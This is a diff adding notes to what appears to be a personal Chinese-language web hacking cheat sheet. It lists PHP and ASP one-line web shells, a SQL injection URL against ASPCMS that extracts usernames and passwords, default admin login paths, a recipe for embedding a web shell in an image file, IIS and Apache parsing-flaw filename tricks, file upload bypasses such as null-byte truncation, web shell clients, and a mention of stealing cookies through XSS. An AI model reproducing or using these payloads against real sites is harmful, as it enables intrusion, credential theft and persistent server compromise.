@@ -101,3 +101,55 @@ https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/
 
 # 一句话木马php
 “<?php  @eval($_POST['cracer']; ?>
+
+
+###########################
+# 常见CMS
+wordpress
+docify 生成文档
+dumi  生成文档
+imgcook
+ant design landing
+one nac 导航网站
+discu
+discuq  论坛,素材下载，帖子站点
+帝国cms和织梦cms
+
+#ASPCMS 漏洞:
+默认后台:
+/admin_aspcms/login.asp
+/admin/login.asp
+/admin_login.asp
+有限公司--Powered by ASPCMS 2.0
+
+/plug/comment/commentList.asp?id=0%20unmasterion%20semasterlect%20top%201%20UserID,GroupID,LoginName,Password,now%28%29,null,1%20%20frmasterom%20{prefix}user
+
+<meta http-equiv="refresh" content="3;url=http://wwwbaidu.com">
+4秒跳转到百度
+
+
+#一句话木马:
+asp:<%eval request("values") %>
+php:<?php @eval($_POST[value];?>
+客户端:中国菜刀,lanker一句话客户端
+
+# 制作图片木马
+c32：1.将一句话木马加入图片，2.上传到服务器,3.访问获得图片地址,4.用客户端连接
+cmd:  copy /b 1.jpg+1.asp 2.jpg
+
+iis解析漏洞：dir.asp/  filename.asp;.jpg
+apache解析漏洞:cracer.php.owf
+nginx畸形解析漏洞:
+
+#文件上传漏洞
+1.filepath配合解析漏洞
+2.%00截断
+3.filetype
+4.双文件上传 # 上传两个文件:第一个正常图片，第二个为木马
+
+#XSS常用的小工具
+Hackbar
+Live HTTP Headers
+
+# 免费xss平台
+xss 盗取cookie后，使用啊D注入工具利用
